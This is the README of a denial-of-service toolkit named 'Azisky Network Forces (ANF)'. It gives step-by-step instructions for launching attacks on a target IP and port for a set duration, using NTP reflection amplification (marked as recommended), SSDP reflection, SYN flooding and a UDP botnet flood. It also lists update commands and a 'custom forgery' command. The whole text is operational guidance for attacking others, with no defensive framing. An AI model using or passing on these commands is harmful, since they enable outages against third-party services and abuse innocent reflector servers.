Azisky Network Forces(ANF)
----------------------------
This script is running on Linux system. anf/ddos/ is for windows user, but you have to have a web package sender server to run this.
------------------------------------------------------------------------------------------------------------------------------------------


For Linux user(CC)：
----------------
1: You need to upload this to your system.
2: Open terminal, use "./anf" to run anf
3: Follow the guides&examples to launch your attach!


For Windows user(DDOS):
-----------------
You will have to own a package sender server. 
- Update ntp script: "./ddos ntp update -1" 
- Update udp script: "./ddos udp update -1" 
- Update syn script: "./ddos syn update -1" 
- attack : "sudo -i" 
- custom forgery ： "./la us 100 ntp udp ssdp -1"
There are following methods to attach:

- NTP reflection amplification(Recommended) ： "./ntp {ip} {port} ntp.txt 10 -1 {time(seconds)}"
- SSDP reflection : "./ssdp {ip} {port} ssdp.txt 10 -1 {time(seconds)}"
- SYN flood : "./syn {ip} {port} {time(seconds)}"
- UDP botnet ： "./udp {ip} {port} 10 888 -1 {time(seconds)}" (botnet supported)
